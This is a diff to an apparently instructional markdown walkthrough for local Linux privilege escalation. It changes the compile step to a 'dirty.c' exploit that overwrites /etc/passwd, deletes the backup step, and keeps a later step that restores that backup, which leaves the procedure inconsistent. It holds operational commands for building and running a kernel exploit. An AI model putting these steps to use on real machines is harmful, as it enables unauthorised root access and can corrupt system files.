@@ -19,26 +19,22 @@ cat /proc/version
 ### 2) Get & compile the exploit
 ```bash
 # assuming pkemn.c is in the current dir
-gcc -O2 -pthread -o pkemn pkemn.c
+gcc -pthread dirty.c -o dirty -lcrypt
 ```
 
-### 3) (Optional) Backup target file if attempting passwd overwrite
+
+### 3) Run exploit
 ```bash
-cp /etc/passwd /tmp/passwd.bak
+./dirty
 ```
 
-### 4) Run exploit
-```bash
-./pkemn
-```
-
-### 5) Verify escalation
+### 4) Verify escalation
 ```bash
 id
 whoami
 ```
 
-### 6) (Optional) Restore backup
+### 5) (Optional) Restore backup
 ```bash
 [ -f /tmp/passwd.bak ] && sudo cp /tmp/passwd.bak /etc/passwd
 ```
